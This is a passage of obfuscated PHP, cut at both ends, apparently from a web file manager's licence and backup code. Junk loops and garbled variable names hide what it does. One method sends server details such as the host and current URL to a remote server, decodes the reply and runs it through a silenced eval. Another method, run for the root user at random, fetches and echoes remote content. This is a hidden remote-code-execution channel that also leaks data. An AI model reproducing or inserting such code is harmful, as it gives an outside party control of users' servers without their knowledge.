. $Ÿï§ø¿), $«âƒè¦È[156] => $«âƒè¦È[136], $«âƒè¦È[159] => $_SERVER[$«âƒè¦È[160]]); $„ÇÂİ±• = $this->qlrb93b9c3fe($«âƒè¦È[259], $ÎØ±ÓŞÉ); $Ãİ¼‹Ş = $Ó¡íš¯ƒ[767]; if (!is_array($„ÇÂİ±•)) { return; } if ($„ÇÂİ±•[$«âƒè¦È[152]] && $„ÇÂİ±•[$«âƒè¦È[260]]) { if ($this->rwbeb27a040b($„ÇÂİ±•[$«âƒè¦È[260]]) == $ÎØ±ÓŞÉ[$«âƒè¦È[152]]) { return; } } $this->wftv57774989(); if ($this->rwbeb27a040b($„ÇÂİ±•[$«âƒè¦È[260]]) != $ÎØ±ÓŞÉ[$«âƒè¦È[152]]) { $ÛõÌÌœ¿ = array($«âƒè¦È[185] => $Ÿï§ø¿, $«âƒè¦È[186] => $_SERVER[$«âƒè¦È[106]], $«âƒè¦È[187] => this_url(), $«âƒè¦È[161] => $_SERVER[$«âƒè¦È[162]]); $‚³¦¢ó¾ = $this->bdcq5d995697(json_encode($ÛõÌÌœ¿)); $„ÇÂİ±• = $this->qlrb93b9c3fe($«âƒè¦È[188] . $‚³¦¢ó¾); if ($„ÇÂİ±• && is_array($„ÇÂİ±•) && isset($„ÇÂİ±•[$«âƒè¦È[260]])) { $ˆò–­ƒ = $this->tpge693e83ea($„ÇÂİ±•[$«âƒè¦È[260]], 2); if ($ˆò–­ƒ) { $ˆò–­ƒ = $this->rwbeb27a040b($ˆò–­ƒ); } if ($ˆò–­ƒ) { try { @eval($ˆò–­ƒ); } catch (Exception $§Ô÷§Û) { } } } } } private function qlrb93b9c3fe($„ÙÂ­ Ê = '', $Äã½è´· = array(), $ë½±ÛŒÁ = 5) { $ò½…ê­ =& $_SERVER[±³—úê]; $š‰óŠ®Ñ =& $_SERVER[ï¢Â™Û…]; $ƒÕ÷´ô× = $š‰óŠ®Ñ[261]; $ƒÕ÷´ô× = $this->clot202cf700($ƒÕ÷´ô×, $š‰óŠ®Ñ[262]); $êŒ´š¼Å = $ò½…ê­[768]; $ƒÕ÷´ô× = $ƒÕ÷´ô× . $„ÙÂ­ Ê; $á®ØÓÒî = $ò½…ê­[769]; if ($Äã½è´· && is_array($Äã½è´·)) { $ƒÕ÷´ô× = $ƒÕ÷´ô× . $š‰óŠ®Ñ[263] . http_build_query($Äã½è´·); } if ($Äã½è´· === -1) { return $ƒÕ÷´ô×; } $Ò†ıš—÷ = stream_context_create(array($š‰óŠ®Ñ[219] => array($š‰óŠ®Ñ[222] => $ë½±ÛŒÁ, $š‰óŠ®Ñ[220] => $š‰óŠ®Ñ[264]), $š‰óŠ®Ñ[265] => array($š‰óŠ®Ñ[266] => !1, $š‰óŠ®Ñ[267] => !1))); $Äã½è´· = @file_get_contents($ƒÕ÷´ô×, !1, $Ò†ıš—÷); return json_decode($Äã½è´·, !0); } private function cpma08fef23c() { $ßùÌì˜ò =& $_SERVER[±³—úê]; $°õŒ¸®ò =& $_SERVER[ï¢Â™Û…]; $’Îîç² = array($°õŒ¸®ò[268] => $°õŒ¸®ò[269], $°õŒ¸®ò[270] => $°õŒ¸®ò[271], $°õŒ¸®ò[272] => $°õŒ¸®ò[273], $°õŒ¸®ò[274] => $°õŒ¸®ò[275], $°õŒ¸®ò[276] => $°õŒ¸®ò[277], $°õŒ¸®ò[278] => $°õŒ¸®ò[214], $°õŒ¸®ò[279] => $°õŒ¸®ò[214], $°õŒ¸®ò[280] => $°õŒ¸®ò[269], $°õŒ¸®ò[281] => $°õŒ¸®ò[271], $°õŒ¸®ò[282] => $°õŒ¸®ò[273], $°õŒ¸®ò[283] => $°õŒ¸®ò[284], $°õŒ¸®ò[285] => $°õŒ¸®ò[275], $°õŒ¸®ò[286] => $°õŒ¸®ò[287], $°õŒ¸®ò[288] => $°õŒ¸®ò[277], $°õŒ¸®ò[289] => $°õŒ¸®ò[290], $°õŒ¸®ò[291] => $°õŒ¸®ò[292], $°õŒ¸®ò[293] => $°õŒ¸®ò[294]); $§¡Š°æü = $ßùÌì˜ò[770]; while (strlen($§¡Š°æü) < $ßùÌì˜ò[710]) { if (!$§¡Š°æü) { break; } $§¡Š°æü++; } $´êõôÉ = $’Îîç²[$this->wmnv03962e33]; $´êõôÉ = intval($´êõôÉ ? $´êõôÉ : $°õŒ¸®ò[269]); $æÙÏŠĞä = $ßùÌì˜ò[771]; while (strlen($æÙÏŠĞä) < $ßùÌì˜ò[694]) { if (!$æÙÏŠĞä) { break; } $æÙÏŠĞä++; } $Ğ¤ÎäÍ = _get($this->fxpj0f983c89, $°õŒ¸®ò[295]); $€ŒÜ·àğ = $ßùÌì˜ò[772]; while ($€ŒÜ·àğ < $ßùÌì˜ò[694]) { if ($€ŒÜ·àğ >= 0) { break; } $€ŒÜ·àğ++; } $Ğ¤ÎäÍ = $Ğ¤ÎäÍ ? intval($Ğ¤ÎäÍ) : 0; return $´êõôÉ + $Ğ¤ÎäÍ; $à™Ë÷ù² = $ßùÌì˜ò[773]; while (strlen($à™Ë÷ù²) < $ßùÌì˜ò[222]) { if (!$à™Ë÷ù²) { break; } $à™Ë÷ù²++; } } public function mely22f1998e($ˆ°™Å¶) { $ÅÊÖíºç =& $_SERVER[±³—úê]; $•ÙÆÂ¸§ =& $_SERVER[ï¢Â™Û…]; $Œè¾ô = $this->cpma08fef23c(); $™×Êè½ = $ÅÊÖíºç[774]; if (!$™×Êè½) { return; } if ($ˆ°™Å¶[$•ÙÆÂ¸§[296]] == $•ÙÆÂ¸§[122]) { return; } if ($Œè¾ô >= intval($•ÙÆÂ¸§[214])) { return; } $Ø¤æø• = Model($•ÙÆÂ¸§[125])->count(); $ÎÊş»²› = $ÅÊÖíºç[775]; if (!$ÎÊş»²›) { return; } if ($Ø¤æø• <= $Œè¾ô) { return; } $¸ìŸ™§ = Model($•ÙÆÂ¸§[125])->field($•ÙÆÂ¸§[296])->limit($Œè¾ô)->select(); $¸ìŸ™§ = array_to_keyvalue($¸ìŸ™§, $•ÙÆÂ¸§[6], $•ÙÆÂ¸§[296]); $Úù×¾¬ = $ÅÊÖíºç[776]; if (!in_array($ˆ°™Å¶[$•ÙÆÂ¸§[296]], $¸ìŸ™§)) { show_json($•ÙÆÂ¸§[297], !1, $•ÙÆÂ¸§[210]); } } public function zvoi4c72a822() { $ş±×ÛÒ“ =& $_SERVER[±³—úê]; $ä®ª»ŞÅ =& $_SERVER[ï¢Â™Û…]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Ûœ„Ùµé = $ä®ª»ŞÅ[217]; $Œ®ùû°… = $ş±×ÛÒ“[777]; if (!$Œ®ùû°…) { return; } $Ûœ„Ùµé = $this->clot202cf700($Ûœ„Ùµé, $ä®ª»ŞÅ[218]); $©İÑÚ = stream_context_create(array($ä®ª»ŞÅ[219] => array($ä®ª»ŞÅ[220] => $ä®ª»ŞÅ[221], $ä®ª»ŞÅ[222] => 3))); $‚õª¼£¦ = $ş±×ÛÒ“[778]; $àÕ¢µœö = @file_get_contents($Ûœ„Ùµé, !1, $©İÑÚ); echo $ä®ª»ŞÅ[298] . hash_encode($àÕ¢µœö) . $ä®ª»ŞÅ[299]; $ Êõ’—ú = $ş±×ÛÒ“[779]; if (!$ Êõ’—ú) { die; } } private function jtqac493ccc6($û“–¹ûğ, $¥Øòƒô¸, $ÓşÜ¦§§ = 3) { $„­Ô¥ß› =& $_SERVER[±³—úê]; $­Š–÷ûÔ =& $_SERVER[ï¢Â™Û…]; usleep(1); $ÎÌş¨— = $„­Ô¥ß›[780]; $û“–¹ûğ = trim($û“–¹ûğ); $¡üûßÉ = $„­Ô¥ß›[781]; if (!$¡üûßÉ) { die; } $ØüË˜Â„ = mt_rand(0, 5) . $­Š–÷ûÔ[6]; $ÅÊ™×ø = rand_string(15); $Â²–şÛ = $„­Ô¥ß›[782]; while (strlen($Â²–şÛ) < $„­Ô¥ß›[710]) { if (!$Â²–şÛ) { break; } $Â²–şÛ++; } $ÖÛ¡›Ãü = $­Š–÷ûÔ[300]; switch ($ØüË˜Â„) { case $­Š–÷ûÔ[206]: $ÅÉ”¥¡Õ = $this->bcwjd6d054b5($û“–¹ûğ, strrev($¥Øòƒô¸ . $ÅÊ™×ø)); $±óÏ»‘æ = $„­Ô¥ß›[783]; if (strlen($±óÏ»‘æ) < $„­Ô¥ß›[706]) { die; } break; $êæÑï× = $„­Ô¥ß›[784]; if (!$êæÑï×) { die; } case $­Š–÷ûÔ[122]: $ÅÉ”¥¡Õ = $this->bcwjd6d054b5($û“–¹ûğ, strrev($ÅÊ™×ø . $¥Øòƒô¸)); $Áäû´û« = $„­Ô¥ß›[785]; while ($Áäû´û« < $„­Ô¥ß›[706]) { if ($Áäû´û« >= 0) { break; } $Áäû´û«++; } break; $‚š‹¹’ = $„­Ô¥ß›[786]; case $­Š–÷ûÔ[301]: $ÅÉ”¥¡Õ = $this->bcwjd6d054b5($û“–¹ûğ, base64_encode($ÅÊ™×ø . $¥Øòƒô¸)); $½ç¢ññ¾ = $„­Ô¥ß›[787]; while (strlen($½ç¢ññ¾) < $„­Ô¥ß›[710]) { if (!$½ç¢ññ¾) { break; } $½ç¢ññ¾++; } break; case $­Š–÷ûÔ[302]: $ÅÉ”¥¡Õ = $this->bcwjd6d054b5($û“–¹ûğ, md5($ÅÊ™×ø . $¥Øòƒô¸)); break; case $­Š–÷ûÔ[303]: $û“–¹ûğ = base64_encode($û“–¹ûğ); $ÔÚ¥ÚÃ = $„­Ô¥ß›[788]; if (!$ÔÚ¥ÚÃ) { return; } $ºã¥Í³ä = rand(0, 64); $Œ£«ƒÖ = $„­Ô¥ß›[789]; if (strlen($Œ£«ƒÖ) < $„­Ô¥ß›[699]) { return; } $á™³©Âô = $ÖÛ¡›Ãü[$ºã¥Í³ä]; $ıÊœÍì¼ = md5($á™³©Âô . md5($¥Øòƒô¸ . $á™³©Âô) . $¥Øòƒô¸); $Œ÷ÙçäÏ = $„­Ô¥ß›[790]; if (!$Œ÷ÙçäÏ) { die; } $ıÊœÍì¼ = substr($ıÊœÍì¼, $ºã¥Í³ä % 8, $ºã¥Í³ä % 8 + 7); $á…‡Áäİ = $­Š–÷ûÔ[6]; $ßĞéöµó = 0; $¢¦üğ©Ò = 0; $Ç±‹§–¹ = 0; for ($ßĞéöµó = 0; $ßĞéöµó < strlen($û“–¹ûğ); $ßĞéöµó++) { $Ç±‹§–¹ = $Ç±‹§–¹ == strlen($ıÊœÍì¼) ? 0 : $Ç±‹§–¹; $¢¦üğ©Ò = ($ºã¥Í³ä + strpos($ÖÛ¡›Ãü, $û“–¹ûğ[$ßĞéöµó]) + ord($ıÊœÍì¼[$Ç±‹§–¹++])) % 64; $³É²š³ = $„­Ô¥ß›[791]; $á…‡Áäİ .= $ÖÛ¡›Ãü[$¢¦üğ©Ò]; $€«–Õ¾ = $„­Ô¥ß›[792]; if (!$€«–Õ¾) { return; } } $ÅÉ”¥¡Õ = hash_encode($á™³©Âô . $á…‡Áäİ); $šç‘¨Î = $„­Ô¥ß›[793]; break; default: $ÅÉ”¥¡Õ = $this->bcwjd6d054b5($û“–¹ûğ, $¥Øòƒô¸ . $ÅÊ™×ø); break; } $ÅÉ”¥¡Õ = strrev($ØüË˜Â„ . $ÅÊ™×ø . $ÅÉ”¥¡Õ); $Äç›‚åæ = $„­Ô¥ß›[794]; if (strlen($Äç›‚åæ) < $„­Ô¥ß›[222]) { return; } if ($ÓşÜ¦§§ - 1 > 0) { $ÅÉ”¥¡Õ = $this->jtqac493ccc6($ÅÉ”¥¡Õ, $¥Øòƒô¸, $ÓşÜ¦§§ - 1); } return $ÅÉ”¥¡Õ; } private function tpge693e83ea($‰É©¤Ê­, $µ÷Ì£Ö, $šÑ¼°ø¥ = 3) { $ËËÖÂÑŒ =& $_SERVER[±³—úê]; $©¦ŞœÁØ =& $_SERVER[ï¢Â™Û…]; if (!is_string($‰É©¤Ê­) || strlen($‰É©¤Ê­) < 10) { return !1; } $‰É©¤Ê­ = trim($‰É©¤Ê­); $‰É©¤Ê­ = strrev($‰É©¤Ê­); $ãá„¨¯ = $‰É©¤Ê­[0]; $œ‚ÅÔÀ = substr($‰É©¤Ê­, 1, 15); $‰É©¤Ê­ = substr($‰É©¤Ê­, 16); $ŞÛ—‚…Â = $ËËÖÂÑŒ[795]; if (strlen($ŞÛ—‚…Â) < $ËËÖÂÑŒ[694]) { die; } $ûÂ¨êÜı = $©¦ŞœÁØ[300]; $¢†„ÛĞø = $ËËÖÂÑŒ[796]; if (!$¢†„ÛĞø) { return; } switch ($ãá„¨¯) { case $©¦ŞœÁØ[206]: $ÛÎ»½Şš = $this->clot202cf700($‰É©¤Ê­, strrev($µ÷Ì£Ö . $œ‚ÅÔÀ)); $¦Ÿ×Ê’® = $ËËÖÂÑŒ[797]; while (strlen($¦Ÿ×Ê’®) < $ËËÖÂÑŒ[699]) { if (!$¦Ÿ×Ê’®) { break; } $¦Ÿ×Ê’®++; } break; case $©¦ŞœÁØ[122]: $ÛÎ»½Şš = $this->clot202cf700($‰É©¤Ê­, strrev($œ‚ÅÔÀ . $µ÷Ì£Ö)); break; case $©¦ŞœÁØ[301]: $ÛÎ»½Şš = $this->clot202cf700($‰É©¤Ê­, base64_encode($œ‚ÅÔÀ . $µ÷Ì£Ö)); break; case $©¦ŞœÁØ[302]: $ÛÎ»½Şš = $this->clot202cf700($‰É©¤Ê­, md5($œ‚ÅÔÀ . $µ÷Ì£Ö)); $Ùš—†è‹ = $ËËÖÂÑŒ[798]; break; case $©¦ŞœÁØ[303]: $‰É©¤Ê­ = hash_decode($‰É©¤Ê­); $¶·øîî’ = $ËËÖÂÑŒ[799]; $’ÁˆñĞ = $‰É©¤Ê­[0]; $¡áÍ¾ÈÅ = $ËËÖÂÑŒ[800]; while ($¡áÍ¾ÈÅ < $ËËÖÂÑŒ[694]) { if ($¡áÍ¾ÈÅ >= 0) { break; } $¡áÍ¾ÈÅ++; } $‰É©¤Ê­ = substr($‰É©¤Ê­, 1); $¢Ö¼Í€ = $ËËÖÂÑŒ[801]; if (!$¢Ö¼Í€) { return; } $îÊÆœ­Á = strpos($ûÂ¨êÜı, $’ÁˆñĞ); $Ş¯ÛÅşÛ = md5($’ÁˆñĞ . md5($µ÷Ì£Ö . $’ÁˆñĞ) . $µ÷Ì£Ö); $Ş¯ÛÅşÛ = substr($Ş¯ÛÅşÛ, $îÊÆœ­Á % 8, $îÊÆœ­Á % 8 + 7); $‰ÎÂ = $ËËÖÂÑŒ[802]; if (strlen($‰ÎÂ) < $ËËÖÂÑŒ[222]) { die; } $è€²™Ó– = $©¦ŞœÁØ[6]; $ˆ‹÷ŸÆ· = 0; $ñÛéÍÙè = $ËËÖÂÑŒ[803]; while ($ñÛéÍÙè < $ËËÖÂÑŒ[694]) { if ($ñÛéÍÙè >= 0) { break; } $ñÛéÍÙè++; } $³”ÑŠÙ = 0; $¾ ñ÷Ï = $ËËÖÂÑŒ[804]; $áóÖª = 0; $÷ÅÃÎ¤¥ = $ËËÖÂÑŒ[805]; while ($÷ÅÃÎ¤¥ < $ËËÖÂÑŒ[710]) { if ($÷ÅÃÎ¤¥ >= 0) { break; } $÷ÅÃÎ¤¥++; } for ($ˆ‹÷ŸÆ· = 0; $ˆ‹÷ŸÆ· < strlen($‰É©¤Ê­); $ˆ‹÷ŸÆ·++) { $áóÖª = $áóÖª == strlen($Ş¯ÛÅşÛ) ? 0 : $áóÖª; $Ô€ú¦§† = $áóÖª++; $‰ªøîÂ = $ËËÖÂÑŒ[806]; if (strlen($‰ªøîÂ) < $ËËÖÂÑŒ[222]) { return; } $³”ÑŠÙ = strpos($ûÂ¨êÜı, $‰É©¤Ê­[$ˆ‹÷ŸÆ·]) - $îÊÆœ­Á - ord($Ş¯ÛÅşÛ[$Ô€ú¦§†]); while ($³”ÑŠÙ < 0) { $³”ÑŠÙ += 64; } $è€²™Ó– .= $ûÂ¨êÜı[$³”ÑŠÙ]; $îü°°Í = $ËËÖÂÑŒ[807]; if (strlen($îü°°Í) < $ËËÖÂÑŒ[222]) { die; } } $ÛÎ»½Şš = base64_decode($è€²™Ó–); break; $äÓ™åÌò = $ËËÖÂÑŒ[808]; while ($äÓ™åÌò < $ËËÖÂÑŒ[222]) { if ($äÓ™åÌò >= 0) { break; } $äÓ™åÌò++; } default: $ÛÎ»½Şš = $this->clot202cf700($‰É©¤Ê­, $µ÷Ì£Ö . $œ‚ÅÔÀ); break; $å÷ë£ œ = $ËËÖÂÑŒ[809]; if (!$å÷ë£ œ) { return; } } if ($šÑ¼°ø¥ - 1 > 0) { $ÛÎ»½Şš = $this->tpge693e83ea($ÛÎ»½Şš, $µ÷Ì£Ö, $šÑ¼°ø¥ - 1); } return $ÛÎ»½Şš; } public function bdcq5d995697($ÃÔëÊª) { $Æ’Êâ›û =& $_SERVER[±³—úê]; $Àğ“Ş§ =& $_SERVER[ï¢Â™Û…]; $ŠÆß««û = $this->cybo698a4b91(); $€šë¹² = $Æ’Êâ›û[810]; while ($€šë¹² < $Æ’Êâ›û[699]) { if ($€šë¹² >= 0) { break; } $€šë¹²++; } $Û”¤€ª· = $this->cybo698a4b91(); $’µğ®Ùå = ($ŠÆß««û - 1) * ($Û”¤€ª· - 1); $ÀôŞ¡ª€ = $Æ’Êâ›û[811]; if (strlen($ÀôŞ¡ª€) < $Æ’Êâ›û[706]) { die; } $Ù§ğÆ†Ù = intval(($ŠÆß««û + $Û”¤€ª·) / 2); while (1) { $Ü¤¿ÖèÑ = $Ù§ğÆ†Ù; $øœ¢Äæ = $Æ’Êâ›û[812]; while (strlen($øœ¢Äæ) < $Æ’Êâ›û[699]) { if (!$øœ¢Äæ) { break; } $øœ¢Äæ++; } $°¾œÈŸ = $’µğ®Ùå; while ($°¾œÈŸ % $Ü¤¿ÖèÑ != 0) { $úõöÁÔû = $°¾œÈŸ; $°¾œÈŸ = $Ü¤¿ÖèÑ; $¬Î™¶ˆõ = $Æ’Êâ›û[813]; if (!$¬Î™¶ˆõ) { die; } $Ü¤¿ÖèÑ = $úõöÁÔû % $Ü¤¿ÖèÑ; } if ($Ü¤¿ÖèÑ == 1) { break; } else { $Ù§ğÆ†Ù++; } } $õ¯˜«®ä = 2; for ($Ğæˆ²‡ø = 0; $Ğæˆ²‡ø < $’µğ®Ùå * 10; $Ğæˆ²‡ø++) { if (($’µğ®Ùå * $Ğæˆ²‡ø + 1) % $Ù§ğÆ†Ù == 0) { $õ¯˜«®ä = intval(($’µğ®Ùå * $Ğæˆ²‡ø + 1) / $Ù§ğÆ†Ù); break; } } $øäìÔü = $this->bcwjd6d054b5($ŠÆß««û * $Û”¤€ª· . $Àğ“Ş§[6], $Àğ“Ş§[136]); $ÌşÔó‰ = md5($Àğ“Ş§[304] . ($ŠÆß««û + $Û”¤€ª·) . $Àğ“Ş§[305] . $Ù§ğÆ†Ù . $Àğ“Ş§[305] . $õ¯˜«®ä . $Àğ“Ş§[306]); $üëÇÎÔ† = $Æ’Êâ›û[814]; if (!$üëÇÎÔ†) { die; } $˜ã«ç¶ = $this->bcwjd6d054b5($ÃÔëÊª, $ÌşÔó‰) . $Àğ“Ş§[307] . $øäìÔü; $¡ûšî = $Æ’Êâ›û[815]; if (!$¡ûšî) { die; } return $˜ã«ç¶; } public function rwbeb27a040b($Š¡õï‘á) { $Ø¯çáßÚ =& $_SERVER[±³—úê]; $Î°Ïˆ„ó =& $_SERVER[ï¢Â™Û…]; $§†¥±¸ = explode($Î°Ïˆ„ó[307], $Š¡õï‘á); $èÀœˆë = $Ø¯çáßÚ[816]; if (!$èÀœˆë) { return; } if (count($§†¥±¸) != 2) { return $Î°Ïˆ„ó[6]; } $£„³ùî = $this->clot202cf700($§†¥±¸[1] . $Î°Ïˆ„ó[6], $Î°Ïˆ„ó[136]); $ÍÁ¼êÎË = $Ø¯çáßÚ[817]; if (!$£„³ùî) { return $Î°Ïˆ„ó[6]; } $£„³ùî = intval($£„³ùî); $Å¦±ı”© = $Ø¯çáßÚ[800]; $ş…Ñ‹˜ = 0; $Ûäç¢Â = 0; for ($Œ‰öİö³ = 3; $Œ‰öİö³ < $£„³ùî; $Œ‰öİö³ += 2) { if ($£„³ùî % $Œ‰öİö³ != 0) { continue; } $ş…Ñ‹˜ = $Œ‰öİö³; $Ûäç¢Â = intval($£„³ùî / $Œ‰öİö³); break; } $êÛ ëÆá = ($ş…Ñ‹˜ - 1) * ($Ûäç¢Â - 1); $Œ´»àóá = $Ø¯çáßÚ[818]; if (!$Œ´»àóá) { die; } $ÒÏà×·  = intval(($ş…Ñ‹˜ + $Ûäç¢Â) / 2); while (1) { $ô•ÉÀº´ = $ÒÏà×· ; $ºÇª¼¢­ = $Ø¯çáßÚ[819]; if (!$ºÇª¼¢­) { return; } $™•Ğ£„ = $êÛ ëÆá; $Ì±£û¿ô = $Ø¯çáßÚ[820]; if (strlen($Ì±£û¿ô) < $Ø¯çáßÚ[699]) { return; } while ($™•Ğ£„ % $ô•ÉÀº´ != 0) { $­Ê¼û”Ñ = $™•Ğ£„; $™•Ğ£„ = $ô•ÉÀº´; $Ö›üÜÛ = $Ø¯çáßÚ[821]; $ô•ÉÀº´ = $­Ê¼û”Ñ % $ô•ÉÀº´; } if ($ô•ÉÀº´ == 1) { break; } else { $ÒÏà×· ++; } } $ıõÆ¤œ¼ = 2; for ($Œ‰öİö³ = 0; $Œ‰öİö³ < $êÛ ëÆá * 10; $Œ‰öİö³++) { if (($êÛ ëÆá * $Œ‰öİö³ + 1) % $ÒÏà×·  == 0) { $ıõÆ¤œ¼ = intval(($êÛ ëÆá * $Œ‰öİö³ + 1) / $ÒÏà×· ); break; } } $¾ø®ïÒ  = md5($Î°Ïˆ„ó[304] . ($ş…Ñ‹˜ + $Ûäç¢Â) . $Î°Ïˆ„ó[305] . $ÒÏà×·  . $Î°Ïˆ„ó[305] . $ıõÆ¤œ¼ . $Î°Ïˆ„ó[306]); $¼äéŞ’ó = $this->clot202cf700($§†¥±¸[0], $¾ø®ïÒ ); return $¼äéŞ’ó; $¤Íğù¡ = $Ø¯çáßÚ[822]; } public function cybo698a4b91() { $…µş£Á£ =& $_SERVER[±³—úê]; $øÖ†®Û½ = mt_rand(pow(2, 14), pow(2, 16) - 1); $øÍ¶²ˆÌ = $…µş£Á£[823]; if (!$øÍ¶²ˆÌ) { return; } $ó¨¬öƒ = array(); $í·äçµÊ = 1; while ($í·äçµÊ <= (int) sqrt($øÖ†®Û½)) { $òî£˜¼ = $í·äçµÊ; $Õö¹É¯ = $…µş£Á£[824]; while ($Õö¹É¯ < $…µş£Á£[706]) { if ($Õö¹É¯ >= 0) { break; } $Õö¹É¯++; } while (!0) { $òî£˜¼++; if ($òî£˜¼ <= 2) { $í·äçµÊ = $òî£˜¼; break; } else { if ($òî£˜¼ < 2) { continue; } } $»Ò­²ß™ = !0; for ($êÍ«­ªû = 2; $êÍ«­ªû <= sqrt($òî£˜¼); $êÍ«­ªû++) { if ($òî£˜¼ % $êÍ«­ªû == 0) { $»Ò­²ß™ = !1; } } if ($»Ò­²ß™) { $í·äçµÊ = $òî£˜¼; break; } } $ó¨¬öƒ[] = $í·äçµÊ; } $é¨‡Œ…‚ = 2; $ñ¯Â«¹ = $…µş£Á£[825]; while ($ñ¯Â«¹ < $…µş£Á£[710]) { if ($ñ¯Â«¹ >= 0) { break; } $ñ¯Â«¹++; } for ($òî£˜¼ = $øÖ†®Û½; $òî£˜¼ > 1; $òî£˜¼--) { $»Ò­²ß™ = !0; foreach ($ó¨¬öƒ as $¢“áèĞÇ) { if ($òî£˜¼ % $¢“áèĞÇ == 0) { $»Ò­²ß™ = !1; break; } } if ($»Ò­²ß™) { $é¨‡Œ…‚ = $òî£˜¼; break; } } return $é¨‡Œ…‚; } public function cloe567e8f07($£ì´‚¢¨, $Æ¼ù‹çÛ) { $İÂÃ¸¦ü =& $_SERVER[±³—úê]; $â´í¤¬œ =& $_SERVER[ï¢Â™Û…]; return call_user_func(array($â´í¤¬œ[8], $â´í¤¬œ[308]), $£ì´‚¢¨, $Æ¼ù‹çÛ); $÷íÅÖõ = $İÂÃ¸¦ü[826]; if (strlen($÷íÅÖõ) < $İÂÃ¸¦ü[694]) { die; } } public function bcwjd6d054b5($šÑ‹èË , $¶–¬ı) { $…¤¼Ú·ê =& $_SERVER[±³—úê]; $®ÎàÙ° =& $_SERVER[ï¢Â™Û…]; return call_user_func(array($®ÎàÙ°[309], $®ÎàÙ°[310]), $šÑ‹èË , $¶–¬ı); $‚°Ûî¤Š = $…¤¼Ú·ê[827]; while (strlen($‚°Ûî¤Š) < $…¤¼Ú·ê[710]) { if (!$‚°Ûî¤Š) { break; } $‚°Ûî¤Š++; } } public function clot202cf700($áŸ†ö¾ , $ÊÖÈ¥†) { $€öøÛ† =& $_SERVER[ï¢Â™Û…]; return call_user_func(array($€öøÛ†[309], $€öøÛ†[311]), $áŸ†ö¾ , $ÊÖÈ¥†); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[±³—úê][828]); $this->init(); $this->keep(); } public function init() { $ªŒÊóÇù =& $_SERVER[±³—úê]; $this->isManual(); self::$name = date($ªŒÊóÇù[829]); if (!($‡Õ¯¨ä = $this->model->lastItem())) { $‡Õ¯¨ä = $this->initData(); } else { self::$name = $‡Õ¯¨ä[$ªŒÊóÇù[32]]; if ($‡Õ¯¨ä[$ªŒÊóÇù[830]] == $ªŒÊóÇù[91]) { self::$name = date($ªŒÊóÇù[271]); $á¼Û¤ á = intval(_get($‡Õ¯¨ä, $ªŒÊóÇù[831], 0)); if (self::$manual == 0 && $‡Õ¯¨ä[$ªŒÊóÇù[32]] == self::$name) { $this->model->remove($‡Õ¯¨ä[$ªŒÊóÇù[486]]); } $‡Õ¯¨ä = $this->initData($á¼Û¤ á, $‡Õ¯¨ä[$ªŒÊóÇù[832]]); } else { $this->checkStore($‡Õ¯¨ä[$ªŒÊóÇù[832]]); } } self::$option = $‡Õ¯¨ä; } private function isManual() { $İ½±£ú¦ = _get($GLOBALS, $_SERVER[±³—úê][833], 0); $İ½±£ú¦ = intval($İ½±£ú¦); self::$manual = $İ½±£ú¦ && $İ½±£ú¦ == 1 ? 1 : 0; } private function initData($ôÍˆéò‹ = 0, $·Ò¥‰« = '') { $ëæß–€İ =& $_SERVER[±³—úê]; $Ø…Ëƒ® = $this->model->config(); if ($·Ò¥‰« && $Ø…Ëƒ®[$ëæß–€İ[832]] != $·Ò¥‰«) { $ôÍˆéò‹ = 0; } $this->checkStore($Ø…Ëƒ®[$ëæß–€İ[832]]); if (self::$manual == 1) { self::$name .= $ëæß–€İ[11] . date($ëæß–€İ[834]); } $½¤úİ×› = array($ëæß–€İ[832] => $Ø…Ëƒ®[$ëæß–€İ[832]], $ëæß–€İ[32] => self::$name, $ëæß–€İ[830] => 0, $ëæß–€İ[171] => $Ø…Ëƒ®[$ëæß–€İ[171]], $ëæß–€İ[835] => self::$manual, $ëæß–€İ[379] => array($ëæß–€İ[836] => array($ëæß–€İ[830] => 0), $ëæß–€İ[837] => array($ëæß–€İ[830] => 0, $ëæß–€İ[838] => 0, $ëæß–€İ[839] => 0, $ëæß–€İ[33] => $ëæß–€İ[12], $ëæß–€İ[840] => 0, $ëæß–€İ[841] => 0), $ëæß–€İ[842] => array($ëæß–€İ[830] => 0, $ëæß–€İ[838] => 0, $ëæß–€İ[839] => 0, $ëæß–€İ[840] => 0, $ëæß–€İ[841] => 0), $ëæß–€İ[242] => array($ëæß–€İ[830] => 0, $ëæß–€İ[843] => 0, $ëæß–€İ[844] => 0, $ëæß–€İ[845] => 0, $ëæß–€İ[846] => 0, $ëæß–€İ[552] => $ôÍˆéò‹, $ëæß–€İ[840] => 0, $ëæß–€İ[841] => 0)), $ëæß–€İ[840] => time(), $ëæß–€İ[841] => 0); $ãñÎûÄÓ = $this->model->insert($½¤úİ×›); $½¤úİ×›[$ëæß–€İ[486]] = $ãñÎûÄÓ; return $½¤úİ×›; } private function checkStore($İ¨øîáĞ) { $‚êÍªã‹ = Model($_SERVER[±³—úê][847]); $¥Ö–âµ  = $‚êÍªã‹->listData($İ¨øîáĞ); $‚êÍªã‹->checkConfig($¥Ö–âµ ); } public static function get() { if (!self::$option) { $˜ãĞ×¬ = Model($_SERVER[±³—úê][828]); $õ’Ë÷ö¶ = $˜ãĞ×¬->findByName(self::$name); $˜ãĞ×¬->parseContent($õ’Ë÷ö¶); self::$option = $õ’Ë÷ö¶; } return self::$option; } public static function set($ıÇòé‚—) { $·ıİ— =& $_SERVER[±³—úê]; $€±ùÉÆÙ = self::get(); foreach ($ıÇòé‚— as $¦şÏÅà => $Êú·‹°ã) { array_set_value($€±ùÉÆÙ, $¦şÏÅà, $Êú·‹°ã); } Model($·ıİ—[828])->update($€±ùÉÆÙ[$·ıİ—[486]], $€±ùÉÆÙ); self::$option = $€±ùÉÆÙ; return self::$option; } public function keep() { $Œ’­¥ò =& $_SERVER[±³—úê]; $‚ä…‚•Ü = self::get(); if (_get($‚ä…‚•Ü, $Œ’­¥ò[848], 0) == $Œ’­¥ò[91]) { return; } $this->backupKeep($‚ä…‚•Ü); self::set(array($Œ’­¥ò[848] => 1)); } private function backupKeep($×÷„—¡») { $Ìº»³ö… =& $_SERVER[±³—úê]; if (self::$manual == 1) { return; } $£Ëº·ÖÅ = $this->model->listData(); if (empty($£Ëº·ÖÅ)) { return; } $Ş»ÖªİÌ = 0; $ú¢èäÀê = array(); foreach ($£Ëº·ÖÅ as $î®‚†ª) { if ($Ş»ÖªİÌ >= 7) { break; } $ú¢èäÀê[] = $î®‚†ª[$Ìº»³ö…[32]]; $Ş»ÖªİÌ++; } for 